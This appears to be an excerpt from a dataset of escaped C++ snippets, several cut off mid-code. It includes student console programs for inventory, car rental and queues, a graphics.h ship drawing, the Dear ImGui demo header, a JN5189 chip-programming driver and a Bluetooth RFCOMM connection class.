\"\\n\\n\\t\\t\\t\\t Add New Item: \\n\";\r\n\tcout << \"----------------------------------------------\"\r\n\t\t\t\"----------------------------\\n\";\r\n\tcout << \" Item Code : \";\r\n\tcin >> Item_Id;\r\n\tcout << \"----------------------------------------------\"\r\n\t\t\t\"----------------------------\\n\";\r\n\tcout << \"\\n\\n\\t\\t\\t Item Name: \";\r\n\tcin >> itm_name;\r\n\tcout << \"\\n\\n\\t\\t\\t Company Name: \";\r\n\tcin >> c_name;\r\n\tcout << \"\\n\\n\\t\\t\\t No. Of Item: \";\r\n\tcin >> no_item;\r\n\tfile.open(\"item.txt\", ios::out | ios::app);\r\n\tfile << \" \" << Item_Id << \" \" << itm_name << \" \"\r\n\t\t<< c_name << \" \" << no_item << \"\\n\";\r\n\tcout << \"==============================================\"\r\n\t\t\t\"============================\"\r\n\t\t<< endl;\r\n\tfile.close();\r\n}\r\n#include <iomanip>  // Include the iomanip header for setw and setfill\r\n\r\n// Display item\r\nvoid dept::display_item()\r\n{\r\n    system(\"cls\");\r\n\r\n    // Using the color combination 0A\r\n    system(\"Color 0A\");\r\n    fstream file;\r\n    int no_item, Item_code;\r\n    string itm_name, c_name;\r\n    \r\n    file.open(\"item.txt\", ios::in);\r\n    if (!file) {\r\n        cout << \"File Opening Error....\" << endl;\r\n    } else {\r\n        cout << setfill('-') << setw(70) << \"-\" << setfill(' ') << endl;\r\n        cout << left << setw(15) << \"Item Code\" << setw(20) << \"Item Name\" << setw(20) << \"Company Name\" << setw(20) << \"No. of Items\" << endl;\r\n        cout << setfill('-') << setw(70) << \"-\" << setfill(' ') << endl;\r\n        \r\n        // To fetch data from file\r\n        file >> Item_code >> itm_name >> c_name >> no_item;\r\n        while (!file.eof()) {\r\n            cout << left << setw(15) << Item_code\r\n                 << setw(20) << itm_name\r\n                 << setw(20) << c_name\r\n                 << setw(20) << no_item << endl;\r\n            // Fetch next data from the file, and the loop continues till EOF\r\n            file >> Item_code >> itm_name >> c_name >> no_item;\r\n        }\r\n        cout << setfill('=') << setw(70) << \"=\" << setfill(' ') << endl;\r\n\r\n        file.close();\r\n    }\r\n}\r\n\r\n\r\n\r\n// check specific item\r\nvoid dept ::check_item()\r\n{\r\n\tsystem(\"cls\");\r\n\t// using the color combination 0A\r\n\tsystem(\"Color 0A\");\r\n\tfstream file;\r\n\tint count = 0;\r\n\tint Item_code;\r\n\tint no_item;\r\n\tstring itm_name, c_name;\r\n\tcout << \"\\n\\n\\t\\t\\t\\t Check Specific Product\\n\";\r\n\tcout << \"----------------------------------------------\"\r\n\t\t\t\"----------------------------------\\n\";\r\n\tfile.open(\"item.txt\", ios ::in);\r\n\tif (!file) {\r\n\t\tcout << \"File Opening Error....\";\r\n\t}\r\n\telse {\r\n\t\tint It_code;\r\n\t\tcout << \"\\n\\n Item Code: \";\r\n\t\tcin >> It_code;\r\n\t\tcout << \"\\n----------------------------------------\"\r\n\t\t\t\t\"----------------------------------\\n\";\r\n\t\t// again fetch next data from the\r\n\t\t// file and the loop continues till\r\n\t\t// eof\r\n\t\tfile >> Item_code >> itm_name >> c_name >> no_item;\r\n\t\twhile (!file.eof()) {\r\n\t\t\tif (It_code == Item_code) {\r\n\t\t\t\tsystem(\"cls\");\r\n\t\t\t\tcout\r\n\t\t\t\t\t<< \"\\n\\n\\t\\t\\t\\tCheck Specific Product\";\r\n\t\t\t\tcout << \"\\n\\n Item Code : \" << Item_code;\r\n\t\t\t\tcout << \"\\n\\n\\t\\t\\tItem Name : \"\r\n\t\t\t\t\t<< itm_name;\r\n\t\t\t\tcout << \"\\n\\n Company : \" << c_name;\r\n\t\t\t\tcout << \"\\n\\n\\t\\t\\tNo. of Item : \"\r\n\t\t\t\t\t<< no_item;\r\n\t\t\t\tcount++;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t// again fetch next data from\r\n\t\t\t// the file and the loop\r\n\t\t\t// continues till eof\r\n\t\t\tfile >> Item_code >> itm_name >> c_name\r\n\t\t\t\t>> no_item;\r\n\t\t}\r\n\t\tfile.close();\r\n\t\tif (count == 0) {\r\n\t\t\tcout << \"Item Not Found....\";\r\n\t\t}\r\n\t}\r\n}\r\n// update item\r\nvoid dept ::update_item()\r\n{\r\n\tsystem(\"cls\");\r\n\t// using the color combination 0A\r\n\r\n\tsystem(\"Color 0A\");\r\n\tfstream file, file1;\r\n\tint no_copy, no_co, count = 0;\r\n\tstring itm_name, b_na, a_name, a_na, newitm_id",
    "// dear imgui, v1.88\n// (demo code)\n\n// Help:\n// - Read FAQ at http://dearimgui.org/faq\n// - Newcomers, read 'Programmer guide' in imgui.cpp for notes on how to setup Dear ImGui in your codebase.\n// - Call and read ImGui::ShowDemoWindow() in imgui_demo.cpp. All applications in examples/ are doing that.\n// Read imgui.cpp for more details, documentation and comments.\n// Get the latest version at https://github.com/ocornut/imgui\n\n// Message to the person tempted to delete this file when integrating Dear ImGui into their codebase:\n// Do NOT remove this file from your project! Think again! It is the most useful reference code that you and other\n// coders will want to refer to and call. Have the ImGui::ShowDemoWindow() function wired in an always-available\n// debug menu of your game/app! Removing this file from your project is hindering access to documentation for everyone\n// in your team, likely leading you to poorer usage of the library.\n// Everything in this file will be stripped out by the linker if you don't call ImGui::ShowDemoWindow().\n// If you want to link core Dear ImGui in your shipped builds but want a thorough guarantee that the demo will not be\n// linked, you can setup your imconfig.h with #define IMGUI_DISABLE_DEMO_WINDOWS and those functions will be empty.\n// In another situation, whenever you have Dear ImGui available you probably want this to be available for reference.\n// Thank you,\n// -Your beloved friend, imgui_demo.cpp (which you won't delete)\n\n// Message to beginner C/C++ programmers about the meaning of the 'static' keyword:\n// In this demo code, we frequently use 'static' variables inside functions. A static variable persists across calls,\n// so it is essentially like a global variable but declared inside the scope of the function. We do this as a way to\n// gather code and data in the same place, to make the demo source code faster to read, faster to write, and smaller\n// in size. It also happens to be a convenient way of storing simple UI related information as long as your function\n// doesn't need to be reentrant or used in multiple threads. This might be a pattern you will want to use in your code,\n// but most of the real data you would be editing is likely going to be stored outside your functions.\n\n// The Demo code in this file is designed to be easy to copy-and-paste into your application!\n// Because of this:\n// - We never omit the ImGui:: prefix when calling functions, even though most code here is in the same namespace.\n// - We try to declare static variables in the local scope, as close as possible to the code using them.\n// - We never use any of the helpers/facilities used internally by Dear ImGui, unless available in the public API.\n// - We never use maths operators on ImVec2/ImVec4. For our other sources files we use them, and they are provided\n//   by imgui_internal.h using the IMGUI_DEFINE_MATH_OPERATORS define. For your own sources file they are optional\n//   and require you either enable those, either provide your own via IM_VEC2_CLASS_EXTRA in imconfig.h.\n//   Because we can't assume anything about your support of maths operators, we cannot use them in imgui_demo.cpp.\n\n// Navigating this file:\n// - In Visual Studio IDE: CTRL+comma (\"Edit.GoToAll\") can follow symbols in comments, whereas CTRL+F12 (\"Edit.GoToImplementation\") cannot.\n// - With Visual Assist installed: ALT+G (\"VAssistX.GoToImplementation\") can also follow symbols in comments.\n\n/*\n\nIndex of this file:\n\n// [SECTION] Forward Declarations, Helpers\n// [SECTION] Demo Window / ShowDemoWindow()\n// - sub section: ShowDemoWindowWidgets()\n// - sub section: ShowDemoWindowLayout()\n// - sub section: ShowDemoWindowPopups()\n// - sub section: ShowDemoWindowTables()\n// - sub section: ShowDemoWindowMisc()\n// [SECTION] About Window / ShowAboutWindow()\n// [SECTION] Style Editor / ShowStyleEditor()\n// [SECTION] Example App: Main Menu Bar / ShowExampleAppMainMenuBar()\n// [SECTION] Example App: Debug Console / ShowExampleAppConsole()\n// [SECTION] Example App: Debug Log / ShowExampleAppLog()\n// [SECTION] Example App: Simple Layout / ShowExampleAppLayout()\n// [SECTION] Example App: Property Editor / ShowExampleAppPropertyEditor()\n// [SECTION] Example App: Long Text / ShowExampleAppLongText()\n// [SECTION] Example App: Auto Resize / ShowExampleAppAutoResize()\n// [SECTION] Example App: Constrained Resize / ShowExampleAppConstrainedResize()\n// [SECTION] Example App: Simple overlay / ShowExampleAppSimpleOverlay()\n// [SECTION] Example App: Fullscreen window / ShowExampleAppFullscreen()\n// [SECTION] Example App: Manipulating window titles / ShowExampleAppWindowTitles()\n// [SECTION] Example App: Custom Rendering using ImDrawList API / ShowExampleAppCustomRendering()\n// [SECTION] Example App: Documents Handling / ShowExampleAppDocuments()\n\n*/\n\n#if defined(_MSC_VER) && !defined(_CRT_SECURE_NO_WARNINGS)\n#define _CRT_SECURE_NO_WARNINGS\n#endif\n\n#include \"imgui.h\"\n#ifndef IMGUI_DISABLE\n\n// System includes\n#include <ctype.h>          // toupper\n#inc",
    "#include <graphics.h>\r\n#include <stdio.h>\r\n\r\n\r\nint main() {\r\n    int gd = DETECT, gm;\r\n    initgraph(&gd, &gm, \"\");\r\n\r\n    // Get screen width and height\r\n    int screenWidth = getmaxx();\r\n    int screenHeight = getmaxy();\r\n\r\n    // Set fill style for upper half (black)\r\n    setfillstyle(SOLID_FILL, BLACK);\r\n    bar(0, 0, screenWidth, screenHeight / 2);\r\n\r\n    // Set fill style for lower half (blue)\r\n    setfillstyle(SOLID_FILL, BLUE);\r\n    bar(0, screenHeight / 2, screenWidth, screenHeight);\r\n\r\n    // Draw a line splitting the screen horizontally (black)\r\n    setcolor(BLACK);\r\n    line(0, screenHeight / 3, screenWidth, screenHeight / 3);\r\n\r\n    //Ship\r\n    setcolor(15); // Set color to white (color code 15)\r\n    line(150, 280, 450, 280);   // Top side\r\n    line(450, 280, 450, 230);   // Right side\r\n    line(450, 230, 130, 200);   // Bottom side\r\n    line(130, 200, 150, 280);   // Left side\r\n\r\n    //Floodfill the ship with blue color\r\n    setfillstyle(SOLID_FILL, LIGHTBLUE);\r\n    floodfill(300, 240, 15);\r\n\r\n\r\n    setcolor(15);\r\n    setfillstyle(SOLID_FILL, LIGHTBLUE); // Set fill style to light blue\r\n\r\n    circle(215, 260, 10); // Window 1\r\n    circle(295, 260, 10); // Window 2\r\n    circle(365, 260, 10); // Window 3\r\n    setfillstyle(SOLID_FILL, LIGHTBLUE);\r\n    floodfill(300, 240, 15);\r\n\r\n\r\n\r\n    //Moon\r\n    setfillstyle(SOLID_FILL, WHITE);\r\n    int circleX = screenWidth / 4;  // X-coordinate of the center of the circle\r\n    int circleY = screenHeight / 6; // Y-coordinate of the center of the circle\r\n    int circleRadius = 30;          // Radius of the circle\r\n    circle(circleX, circleY, circleRadius); // Draw the circle\r\n    floodfill(circleX, circleY, WHITE); // Fill the circle with white color\r\n\r\n\r\n\r\n\r\n    //lower deck\r\n    // Draw lines for decks\r\n    setfillstyle(SOLID_FILL, LIGHTBLUE); // Set fill style to light blue\r\n    setcolor(BLUE); // Set outline color to match the background\r\n\r\n    // Draw the ship's hull line\r\n    line(200, 230, 130, 200);\r\n\r\n    // Draw a rectangle on the ship's hull\r\n    setcolor(BLUE);\r\n    rectangle(200, 200, 450, 230);\r\n\r\n    // Fill the rectangle with light blue color\r\n    floodfill(280, 215, BLUE);\r\n\r\n    // Draw circular windows on the rectangle\r\n    setfillstyle(SOLID_FILL, GREEN); // Set fill style to green for windows\r\n\r\n    // Draw circular windows\r\n\r\n    circle(230, 215, 8);\r\n    circle(280, 215, 8);\r\n    circle(330, 215, 8);\r\n    circle(390, 215, 8);\r\n\r\n    //2nd Deck\r\n    // Drawing the second deck\r\n    setfillstyle(SOLID_FILL, WHITE); // Set fill style to light blue\r\n    setcolor(BLUE); // Set outline color to blue\r\n\r\n    // Second deck coordinates based on the first deck's position\r\n    int secondDeckY1 = 170; // 30 units above the first deck's top\r\n    int secondDeckY2 = 200; // Align with the first deck's top\r\n\r\n    // Draw the second deck rectangle directly above the first\r\n    rectangle(210, secondDeckY1, 440, secondDeckY2);\r\n\r\n    // Fill the second deck rectangle with light blue color\r\n    floodfill(280, 185, BLUE); // Use a point inside the second deck for floodfill\r\n\r\n    // Draw circular windows on the second deck using the same style\r\n    setfillstyle(SOLID_FILL, BLUE); // Set fill style to green for windows\r\n\r\n    circle(230, 185, 8); // Window 1\r\n    circle(280, 185, 8); // Window 2\r\n    circle(330, 185, 8); // Window 3\r\n    circle(390, 185, 8); // Window 4\r\n\r\n    // Optionally, you can fill the windows with a different color if needed\r\n    setfillstyle(SOLID_FILL, GREEN); // Choose the fill color for windows\r\n    floodfill(230, 185, BLUE); // Fill Window 1\r\n    floodfill(280, 185, BLUE); // Fill Window 2\r\n    floodfill(330, 185, BLUE); // Fill Window 3\r\n    floodfill(390, 185, BLUE); // Fill Window 4\r\n\r\n\r\n\r\n    // Fill circular windows with green color\r\n\r\n    floodfill(230, 215, 01);\r\n    floodfill(280, 215, BLUE);\r\n    floodfill(330, 215, BLUE);\r\n    floodfill(390, 215, BLUE);\r\n\r\n\r\n    //Chimney\r\n    // Chimneys on the second deck\r\n    setfillstyle(SOLID_FILL, RED); // Set fill style to red for the chimneys\r\n    setcolor(RED); // Set chimney outline color to red\r\n\r\n    // Adjust chimney dimensions and new positions, moving right and increasing space between them\r\n    int chimneyWidth = 20;\r\n    int chimneyHeight = 30;\r\n    int firstChimneyX1 = 310; // Position of the first chimney\r\n    int firstChimneyX2 = firstChimneyX1 + chimneyWidth;\r\n    int secondChimneyX1 = 360; // Increase space by adjusting position of the second chimney to the right\r\n    int secondChimneyX2 = secondChimneyX1 + chimneyWidth;\r\n    int chimneyY1 = 170 - chimneyHeight; // Top coordinate of chimneys\r\n    int chimneyY2 = 170; // Bottom coordinate aligns with the top of the second deck\r\n\r\n    // Draw the first chimney\r\n    rectangle(firstChimneyX1, chimneyY1, firstChimneyX2, chimneyY2);\r\n    floodfill(firstChimneyX1 + 10, chimneyY1 + 15, RED); // Fill the first chimney with red\r\n\r\n    // Draw the second chimney\r\n    rectangle(secondChimneyX1, chimneyY1, secondChimneyX2, chimn",
    "#include <iostream>\n#include <fstream>\n#include <conio.h>\n#include <unistd.h>\n#include <iomanip>\n#include <windows.h>\n#include <string.h>\n#define MAX 100\n\nusing namespace std;\n\n//functions\nvoid load();\nvoid createAccount();\nvoid menu();\nvoid showCars();\nvoid insertionSort();\nvoid RentedCars();\n\n//global variables\nstring customername;\nstring cnic;\nstring age;\nstring gender;\nstring password;\nstring cpassword;\n\n\nclass CustomerInfo{\n    public:\n    string data;\n    CustomerInfo *next;\n    \n    //constructor\n    CustomerInfo(string value){\n        data = value;\n        next = NULL;\n    }\n};\n\n\nCustomerInfo *head = NULL;\n\n//stack\nclass paymentStack{\n\tpublic:\n\t\tint data;\n\t\tpaymentStack *next;\n\tpaymentStack(int value){\n\t\tdata = value;\n\t\tnext = NULL;\n\t}\n};\npaymentStack *pts;\n\nint peek(paymentStack* root){\n    if (root == NULL)\n        return 0;\n    return root->data;\n}\nvoid push(paymentStack** root, int data){\n    paymentStack* stackNode = new paymentStack(data);\n    (stackNode)->next = *root;\n    *root = stackNode;\n}\n \n\n//Insert function\nvoid insertNode(CustomerInfo **head, string data){\n    if (*head == NULL){\n        *head = new CustomerInfo(data);\n    }\n    else{\n        CustomerInfo *temp = *head;\n        while (temp->next != NULL){\n            temp = temp->next;\n        }\n        temp->next = new CustomerInfo(data);\n    }\n}\nclass carData{\n    private:\n    public:\n    string carmodel;\n    string carnumber;\n    char data;\n};\n\n// Queue Class\nclass QNode{\n    public:\n    string value;\n    QNode *next;\n}*front = NULL, *rear = NULL;\n\nint remainAmount;\nint advanceAmount;\nint rentalfee;\n\n// inhereted class from carDataclass\nclass rent : public carData {\n    public:\n    int days, rentalfee; // additional int vatiables defined\n\n    void data(){\n        int login();\n        \n\t\tcout << \"\\n\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t---------------------------------\";\n        cout << \"\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tCREATE YOUR ACCOUNT \\n\";\n        cout << \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t---------------------------------\\n\\n\";\n        cout << \"\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tEnter Your Name: \";\n        cin >> customername;\n        insertNode(&head, customername);\n        cout << \"\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tEnter CNIC-Number: \";\n        cin >> cnic;\n        insertNode(&head, cnic);\n        cout << \"\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tEnter your Age: \";\n        cin >> age;\n        insertNode(&head, age);\n        cout << \"\\n\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\tEnter Gender: \";\n        cin >> gender;\n        insertNode(&head, gender);\n\n        createAccount();\n        system(\"CLS\");\n        cout << endl;\n        login();\n\n        do{\t\n            mainInfo:\n            cout << \"\\t\\t\\t\\t---------------------------------------------\" << endl; \t\n            cout << \"\\t\\t\\t\\tPlease Select a Car\" << endl; // giving user a choice to select among three different models\n            showCars();\n            cout << endl;\n            cout << \"\\t\\t\\t\\tChoose a Car from the above options: \";\n            cin >> carmodel;\n            cout << endl;\n            if (carmodel == \"A\"){\n                cout<<\"\\t\\t\\t\\tThis car already Rented---\"<<endl;\n                sleep(3);\n                goto mainInfo;\n            }\n            else if (carmodel == \"B\"){\n            \t\n                system(\"CLS\");\n\n                cout << \"You have choosen BMW model 2018AS\" << endl;\n                ifstream inB(\"B.txt\"); // displaying details of model B\n                char str[200];\n                while (inB){\n                    inB.getline(str, 200);\n                    if (inB)\n                        cout << str << endl;\n                }\n                sleep(2);\n            }\n            else if (carmodel == \"F\"){\n                system(\"CLS\");\n                cout << \"You have choosen Ford model 2018DS\" << endl;\n                ifstream inC(\"F.txt\"); // displaying details of model C\n                char str[200];\n                while (inC){\n                    inC.getline(str, 200);\n                    if (inC)\n                        cout << str << endl;\n                }\n                sleep(2);\n            }\n            else if (carmodel == \"H\"){\n                cout<<\"\\t\\t\\t\\tThis car already Rented---\"<<endl;\n                sleep(3);\n                goto mainInfo;\n            }\n\n            else if (carmodel == \"M\"){\n                system(\"CLS\");\n                cout << \"You have choosen Mercedes model 2018OW\" << endl;\n                ifstream inC(\"M.txt\"); // displaying details of model C\n                char str[200];\n                while (inC){\n                    inC.getline(str, 200);\n                    if (inC)\n                        cout << str << endl;\n                }\n                sleep(2);\n            }\n            else if (carmodel == \"S\"){\n                system(\"CLS\");\n                cout << \"You have choosen Skoda model 2005Ps\" << endl;\n                ifstream inC(\"S.txt\"); // displaying details of model C\n                char str[200];\n                while (inC){\n                    inC.getline(st",
    "#include \"jn5189.h\"\n\nstd::vector<uint8_t> JN5189::ISP::unlock(ISPUnlockMode unlock_mode) {\n  switch (unlock_mode) {\n    case ISPUnlockMode::MODE_DEFAULT_STATE: {\n      uint8_t payload[] = {0x00};\n      size_t payload_length = 1;\n\n      auto bytes_sent = __send_req(0x4E, payload, payload_length);\n      break;\n    }\n    case ISPUnlockMode::MODE_START_ISP: {\n      uint8_t payload[] = {0x01, 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88,\n                                 0x11, 0x22, 0x33, 0x44, 0x55, 0x66, 0x77, 0x88};\n      size_t payload_length = 17;\n\n      auto bytes_sent = __send_req(0x4E, payload, payload_length);\n      break;\n    }\n  }\n\n  auto res = __recv_res();\n\n  if (res[4] != 0x00) {\n    debug_serial.printf(\"<-- (ISP): Error 0x%02X\\n\", res[4]);\n    return std::vector<uint8_t>();\n  }\n\n  debug_serial.println(\" (parsed): OK\");\n  return std::vector<uint8_t>();\n}\n\nstd::vector<uint8_t> JN5189::ISP::device_info() {\n  uint8_t payload[] = {};\n  size_t payload_length = 0;\n\n  auto bytes_sent = __send_req(0x32, payload, payload_length);\n  auto res = __recv_res();\n\n  if (res[4] != 0x00) {\n    debug_serial.printf(\"<-- (ISP): Error 0x%02X\\n\", res[4]);\n    return std::vector<uint8_t>();\n  }\n\n  debug_serial.println(\" (parsed): OK\");\n  return std::vector<uint8_t>();\n}\n\nstd::vector<uint8_t> JN5189::ISP::memory_info(uint8_t memory_id) {\n  uint8_t payload[] = {memory_id};\n  size_t payload_length = 1;\n\n  auto bytes_sent = __send_req(0x4C, payload, payload_length);\n  auto res = __recv_res();\n\n  if (res[4] != 0x00) {\n    debug_serial.printf(\"<-- (ISP): Error 0x%02X\\n\", res[4]);\n    return std::vector<uint8_t>();\n  }\n\n  // auto memory_id  = res[5];\n  uint32_t base_addr = res[6] | (res[7] << 8) | (res[8] << 16) | (res[9] << 24);\n  size_t length      = res[10] | (res[11] << 8) | (res[12] << 16) | (res[13] << 24);\n  size_t sector_size = res[14] | (res[15] << 8) | (res[16] << 16) | (res[17] << 24);\n  auto type          = res[18];\n  auto access        = res[19];\n\n  debug_serial.printf(\" (parsed): Memory ID: %u\\n\", memory_id);\n  debug_serial.printf(\" (parsed): Base address: 0x%08X\\n\", base_addr);\n  debug_serial.printf(\" (parsed): Length: 0x%08X\\n\", length);\n  debug_serial.printf(\" (parsed): Sector size: 0x%08X\\n\", sector_size);\n  debug_serial.printf(\" (parsed): Type: %u\\n\", type);\n  debug_serial.printf(\" (parsed): Access: 0x%02X\\n\", access);\n  debug_serial.print(\" (parsed): Name: \");\n  for (size_t i = 20; i < res.size() - 4; i++) {\n    debug_serial.printf(\"%c\", res[i]);\n  }\n  debug_serial.println();\n\n  return res;\n}\n\nstd::vector<uint8_t> JN5189::ISP::memory_open(uint8_t memory_id, uint8_t access_level) {\n  uint8_t payload[] = {memory_id, access_level};\n  size_t payload_length = 2;\n\n  auto bytes_sent = __send_req(0x40, payload, payload_length);\n  auto res = __recv_res();\n\n  if (res[4] != 0x00) {\n    debug_serial.printf(\"<-- (ISP): Error 0x%02X\\n\", res[4]);\n    return std::vector<uint8_t>();\n  }\n\n  debug_serial.println(\" (parsed): OK\");\n  return std::vector<uint8_t>();\n}\n\nstd::vector<uint8_t> JN5189::ISP::memory_close() {\n  uint8_t payload[] = {0x00};\n  size_t payload_length = 1;\n\n  auto bytes_sent = __send_req(0x4A, payload, payload_length);\n  auto res = __recv_res();\n\n  if (res[4] != 0x00) {\n    debug_serial.printf(\"<-- (ISP): Error 0x%02X\\n\", res[4]);\n    return std::vector<uint8_t>();\n  }\n\n  debug_serial.println(\" (parsed): OK\");\n  return std::vector<uint8_t>();\n}\n\nstd::vector<uint8_t> JN5189::ISP::memory_read(uint32_t address, size_t length) {\n  uint8_t payload[10];\n  size_t payload_length = 10;\n\n  payload[0] = 0x00;                    // Handle returned by open memory command: always use 0\n  payload[1] = 0x00;                    // Read mode: always use 0\n  payload[2] = address & 0xFF;          // Address within memory to start reading from\n  payload[3] = (address >> 8) & 0xFF;\n  payload[4] = (address >> 16) & 0xFF;\n  payload[5] = (address >> 24) & 0xFF;\n  payload[6] = length & 0xFF;           // Number of bytes to read\n  payload[7] = (length >> 8) & 0xFF;\n  payload[8] = (length >> 16) & 0xFF;\n  payload[9] = (length >> 24) & 0xFF;\n\n  auto bytes_sent = __send_req(0x46, payload, payload_length);\n  auto res = __recv_res();\n\n  if (res[4] != 0x00) {\n    debug_serial.printf(\"<-- (ISP): Error 0x%02X\\n\", res[4]);\n    return std::vector<uint8_t>();\n  }\n\n  debug_serial.println(\" (parsed): OK\");\n  return std::vector<uint8_t>();\n}\n\nsize_t JN5189::ISP::__send_req(uint8_t type, const uint8_t payload[], size_t payload_length) {\n  // Standard packets format:\n  //  - 1 byte for flags\n  //  - 2 bytes for the request's length (in bytes)\n  //  - 1 byte for the request's type\n  //  - n bytes of payload\n  //  - 4 bytes of CRC-32 checksum\n  uint16_t request_length = 1 + 2 + 1 + payload_length + 4;\n  uint8_t *request = new uint8_t[request_length];\n\n  // Copy bytes\n  request[0] = 0x00;\n  request[1] = (request_length >> 8) & 0xFF;\n  request[2] = request_length & 0xFF;\n  request[3] = type;\n\n  for (size_t i = 0; i < payload_length; i++) {\n    request[i + ",
    "#include <iostream>\nusing namespace std;\n#include <iostream>\nusing namespace std;\n//D\u00e9claration Type File : Repr\u00e9sentation Liste Chain\u00e9e!\ntypedef struct FileL\n{\n int info;\n FileL *suivant;\n};\n/**Fonction enfiler correspond insertDebut, dans une file l'insertion est r\u00e9alis\u00e9e \u00e0 partir\nde la t\u00eate **/\nvoid enfilerL(FileL* &debut, int x )\n{\n FileL * nouveau=new FileL;//Allouer un element, son adresse est affect? nouveau\n nouveau->info=x;\n nouveau->suivant=debut;\n debut=nouveau;\n}\n/**Fonction defiler correspond suppFin, dans une file l'extraction d'un \u00e9l\u00e9ment\nconsiste \u00e0 \u00e9liminer le dernier \u00e9l\u00e9ment de la liste **/\nvoid defilerL(FileL *& debut, int &x)\n{\n FileL * sup;\n if(debut!=0)\n { if(debut->suivant==0)\n {\n x=debut->info;\n delete debut ;\n debut=0;\n }\n else\n { FileL * courant=debut;\n while(courant->suivant->suivant!=0)\n {\n courant= courant->suivant ;\n }\n x=courant->suivant->info;\n delete courant->suivant ;\n courant->suivant=0;\n }\n }\n}\n\n/**Fonction creation de la File (Liste) avec la primitive enfilerL**/\nvoid creationFileL (FileL* &debut, int nbreElements)\n{\n int x;\n for (int i=0; i< nbreElements; i++)\n {\n cout<<\"Donner un entier : \";\n cin>>x;\n enfilerL(debut, x);\n }\n}\n/**Fonction Afficher le contenu de la file repr\u00e9sent\u00e9e par une liste**/\nvoid afficherFileL(FileL *courant)\n{\n if(courant==0) cout<<\"Liste vide\";\n else\n while (courant!= 0)\n {\n cout<<\"[\"<<courant->info<<\"]\\t\";\n courant=courant->suivant;\n }\n}\n/**Extraire m \u00e9l\u00e9ments d'une File(Liste) et les ins\u00e9r\u00e9s dans une autres File(Liste)***/\nvoid ExtraireInsert(FileL *&F1, FileL* &F2, int &m)\n{\n int val;\n FileL* courant=F1;\n cout<<\"\\nDonner le nombre d elements a extraire de File1 pour les inserer dans La File \";\n\n cin>>m;\n for(int i=0; i<m && courant!=0; i++)\n {\n defilerL(F1, val);\n enfilerL(F2, val);\n courant=courant->suivant;\n }\n}\n/**Partitionner une File F en deux Files F1, F2 pour contenir les \u00e9l\u00e9ments impairs et pairs\nrespectivement*/\nvoid partitionner(FileL *F, FileL *&F1, FileL *&F2)\n{\n int val;\n FileL *courant =F;\n while (courant!=0)\n {\n defilerL(F, val);\n if(val%2!=0)\n enfilerL(F1,val);\n else enfilerL(F2, val);\n courant=courant->suivant;\n }\n}\n/**Fonction principale main()*/\nint main()\n{\n /*D\u00e9clarations t\u00eates des files */\n FileL *F1, *F2, *Fi, *Fp;\n int n, m;\n /*Initialisation des t\u00eates \u00e0 0*/\n F1=0;\n F2=0;\n Fi=0;\n Fp=0;\n10 ;\n /*creation files*/\n cout<<\"Donner le nombre d elements a enfiler: \";\n cin>>n;\n cout<<\"Saisir F1:\\n\";\n creationFileL(F1, n);\n cout<<\"\\nSaisir F2:\\n\";\n creationFileL(F2, n);\n /*Affichage F1 et F2*/\n cout<<\"\\nF1:\\n\"; afficherFileL(F1);\n cout<<\"\\nF2:\\n\"; afficherFileL(F2);\n /*Etendre F2 en enfilant les m premiers \u00e9l\u00e9ments de F1*/\n ExtraireInsert (F1,F2,m);\n /*Affichage F1, F2 apr\u00e8s extraction de m \u00e9l\u00e9ments*/\n cout<<\"\\nF1:\\n\"; afficherFileL(F1);\n cout<<\"\\nF2:\\n\"; afficherFileL(F2);\n /*partitionner F1 en deux files: Fi \u00e9l\u00e9ments impairs et Fp \u00e9l\u00e9ments pairs*/\n partitionner(F1, Fi, Fp);\n /*Affichage de de Fi, FP*/\n\n cout<<\"\\nFi:\\n\"; afficherFileL(Fi);\n cout<<\"\\nFp:\\n\"; afficherFileL(Fp);\n return 0;\n}\n",
    "#include \"connection.hpp\"\n#include \"logger.hpp\"\n\n#include <QBluetoothAddress>\n#include <QSharedPointer>\n\n#include <bluetooth/bluetooth.h>\n#include <bluetooth/rfcomm.h>\n#include <cstring>\n#include <errno.h>\n#include <sys/socket.h>\n#include <unistd.h>\n\nConnection::Connection(const QVector<QBluetoothDeviceInfo> &trustedDevices,\n                       Logger &logger, QObject *parent)\n    : QObject{parent}\n    , m_trustedDevices(trustedDevices)\n    , m_logger(logger)\n{\n}\n\nvoid Connection::connect()\n{\n    const unsigned int length = 18; /* MAC Addresses are 17 characters long */\n    QSharedPointer<char> address(new char[length]);\n    struct sockaddr_rc target = {\n        .rc_family = AF_BLUETOOTH,\n        .rc_channel = 2\n    };\n\n    /* Try to connect to every single trusted device until one gets connected. */\n    for (const auto &device : m_trustedDevices) {\n        auto name = device.name();\n        {\n            auto addr = device.address().toString().toStdString();\n            std::snprintf(address.data(), length, \"%s\", addr.c_str());\n        }\n\n        str2ba(address.data(), &target.rc_bdaddr);\n\n        m_logger.log(\n            tr(\"Trying to connect to Bluetooth device: %1 - %2...\").arg(address.data(), name),\n            Q_FUNC_INFO\n        );\n\n        int sock = socket(AF_BLUETOOTH, SOCK_STREAM, BTPROTO_RFCOMM);\n        if (sock < 0) {\n            m_logger.log(tr(\"Couldn't allocate socket to connect to Bluetooth device: %1\\n\"\n                           \"Error: %2\").arg(address.data(), std::strerror(errno)),\n                        Q_FUNC_INFO, Logger::ERROR\n            );\n            close(sock);\n            break;\n        }\n\n        int status = ::connect(sock, (struct sockaddr *) &target, sizeof(target));\n        if (status == 0) {\n            close(sock);\n            m_logger.log(tr(\"Connected to Bluetooth device: %1 - %2!\").arg(address.data(), name), Q_FUNC_INFO);\n            m_connectedDevices.push_back(device);\n            continue;\n        }\n\n        m_logger.log(\n            tr(\"Couldn't connect to Bluetooth device: %1 - %2.\\n\"\n               \"It may be far or has Bluetooth disabled.\").arg(address.data(), name),\n            Q_FUNC_INFO, Logger::WARNING\n        );\n    }\n}\n\nQVector<QBluetoothDeviceInfo> Connection::connectedDevices()\n{\n    return m_connectedDevices;\n}\n",
